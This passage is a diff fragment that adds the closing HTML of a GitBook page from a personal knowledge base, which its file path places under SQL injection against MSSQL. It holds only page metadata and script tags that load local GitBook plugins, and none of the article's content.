知识库","gitbook":"*","description":"不知古道的风，可他吹往的是故里","theme-default":{"showLevel":true}},"file":{"path":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/07.MSSQL.md","mtime":"2024-01-11T16:01:08.765Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2024-06-12T07:27:25.146Z"},"basePath":"../../../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../../../gitbook/gitbook.js"></script>
+    <script src="../../../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-splitter/splitter.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-code/plugin.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-search-pro-fixed/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-search-pro-fixed/search.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-lightbox/js/lightbox.min.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-flexible-alerts/plugin.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-back-to-top-button/plugin.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-auto-scroll-table/plugin.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-hide-element/plugin.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-theme-d4t/script.js"></script>
+        
+    
+
+    </body>
+</html>
+
